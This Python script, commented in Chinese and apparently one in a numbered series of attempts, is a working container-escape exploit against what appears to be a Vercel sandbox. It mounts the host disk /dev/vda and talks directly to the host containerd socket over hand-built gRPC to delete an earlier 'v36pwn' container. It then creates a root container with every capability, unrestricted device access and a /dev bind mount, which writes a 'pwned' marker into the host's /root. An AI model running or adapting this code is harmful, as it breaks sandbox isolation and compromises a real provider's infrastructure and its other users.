# -*- coding: utf-8 -*-
"""vda37_ctrd_create4: /dev bind 修复 + shim 文件侦察 + 容器自验证
P1: shim 文件侦察 (v36pwn 残留 task 目录 bootstrap.json/options.json/log.json + 完整 config.json)
P2: Containers/Delete v36pwn + Create v37pwn (/dev bind, args=验证命令: mount /dev/vda + 写 marker + sleep)
P3: Tasks/Create + Tasks/Start
P4: 验证: init.pid / Tasks/List / cell rootfs marker / task 目录 + log.json
P5: v37pwn rootfs 检查 (/dev bind 可见 cell 设备?)
输出落盘 + 哨兵 V37S_DONE"""
import os, time, socket, ctypes, re, struct, subprocess, json, base64

OUT = '/vercel/sandbox/v37s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=8, ns='default', headers=None):
    try:
        tmp = '/vercel/sandbox/curl_req_%d.bin' % os.getpid()
        hdr = '/vercel/sandbox/curl_hdr_%d.txt' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype, '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        if headers:
            for h in headers:
                cmd += ['-H', h]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 3)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' | ')[:250]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


def show(tag, out, raw=False):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    if raw:
        log('%s -> %s' % (tag, out[:400].decode('utf-8', errors='replace').replace('\n', ' ')))
        return
    strs = re.findall(rb'[\x20-\x7e]{4,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:20]]))


CSP = '/mnt/vdax/run/containerd/containerd.sock'
IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
CID = 'v37pwn'
TASKDIR = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s' % CID


def p1():
    log('=== P1 shim files (old task dirs) ===')
    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    try:
        for c in sorted(os.listdir(base)):
            if c.startswith('v3'):
                cp = os.path.join(base, c)
                log('task %s -> %s' % (c, sorted(os.listdir(cp))))
                for fn in ['bootstrap.json', 'options.json', 'shim-binary-path', 'runtime', 'log.json', 'init.pid']:
                    fp = os.path.join(cp, fn)
                    try:
                        sz = os.path.getsize(fp)
                        content = open(fp, 'rb').read(1200).decode('utf-8', errors='replace')
                        log('%s (%d): %s' % (fn, sz, content[:600].replace('\n', ' ')))
                    except Exception as e:
                        log('%s ERR %s' % (fn, e))
    except Exception as e:
        log('P1 ERR %s' % e)


def make_spec(args):
    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    return {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": args,
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                    "V37_PWNED=1"],
            "cwd": "/",
            "capabilities": {
                "bounding": caps, "effective": caps, "permitted": caps, "ambient": caps
            }
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "rw"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v37pwn-ctr",
            "namespaces": [
                {"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}
            ]
        }
    }


def p2(sk):
    log('=== P2 delete old + Create ===')
    # 清理 v36pwn
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Delete', grpc_env(pstr(1, 'v36pwn')), t=5)
    log('Delete v36pwn %s' % rc)
    # Create
    spec = make_spec(["/bin/sh", "-c",
                      "mkdir -p /mnt; mount /dev/vda /mnt 2>/dev/null; "
                      "echo v37-container-pwned $(date) >> /mnt/root/.v37_marker 2>/dev/null; "
                      "sleep 99999"])
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec)
    ctr += pstr(6, 'overlayfs')
    if sk:
        ctr += pstr(7, sk)
    req = pmsg(1, ctr)
    log('Create req len=%d' % len(req))
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(req), t=7)
    log('Containers/Create %s' % rc)
    show('Create body', out, raw=True)
    return 'grpc-status: 0' in rc


def p3():
    log('=== P3 Tasks/Create+Start ===')
    req = pstr(1, CID)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(req), t=10)
    log('Tasks/Create %s' % rc)
    show('CreateTask body', out, raw=True)
    if 'grpc-status: 0' not in rc:
        # 失败时打 shim 日志
        try:
            for fn in ['log.json', 'log']:
                fp = os.path.join(TASKDIR, fn)
                if os.path.exists(fp):
                    content = open(fp, 'rb').read(2000).decode('utf-8', errors='replace')
                    log('%s tail: %s' % (fn, content[-800:].replace('\n', ' ')))
        except Exception as e:
            log('shim log ERR %s' % e)
        return False
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=10)
    log('Tasks/Start %s' % rc)
    show('Start body', out, raw=True)
    return 'grpc-status: 0' in rc


def p4():
    log('=== P4 verify ===')
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/List', grpc_env(b''), t=4)
    log('Tasks/List %s' % rc)
    show('Tasks body', out)
    if b'v37pwn' in out:
        log('*** V37PWN TASK VISIBLE ***')
    try:
        log('task dir: %s' % sorted(os.listdir(TASKDIR)))
        for fn in ['init.pid', 'config.json']:
            fp = os.path.join(TASKDIR, fn)
            try:
                if fn == 'init.pid':
                    log('init.pid: %s' % open(fp).read().strip())
                else:
                    head = open(fp, 'rb').read(3000).decode('utf-8', errors='replace')
                    log('config head: %s' % head[:1000].replace('\n', ' '))
            except Exception as e:
                log('%s ERR %s' % (fn, e))
    except Exception as e:
        log('task dir ERR %s' % e)
    # marker
    try:
        mk = '/mnt/vdax/root/.v37_marker'
        log('marker exists: %s' % os.path.exists(mk))
        if os.path.exists(mk):
            log('marker content: %s' % open(mk).read().strip())
    except Exception as e:
        log('marker ERR %s' % e)


def p5():
    log('=== P5 v37pwn rootfs check ===')
    try:
        rf = os.path.join(TASKDIR, 'rootfs')
        log('rootfs: %s' % sorted(os.listdir(rf))[:20])
        devp = os.path.join(rf, 'dev')
        if os.path.isdir(devp):
            log('rootfs/dev: %s' % sorted(os.listdir(devp))[:30])
        # 看 rootfs 是否 bind 了 cell /dev (vda 可见?)
        if os.path.exists(os.path.join(devp, 'vda')):
            log('*** CELL /dev/vda VISIBLE IN V37 ROOTFS ***')
    except Exception as e:
        log('P5 ERR %s' % e)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    p1()
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    m = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out)
    sk = m.group().decode() if m else None
    log('snap_key=%s' % sk)
    ok = p2(sk)
    if ok:
        ok2 = p3()
        if ok2:
            p4()
            p5()

    log('V37S_DONE')
    f.close()


if __name__ == '__main__':
    main()
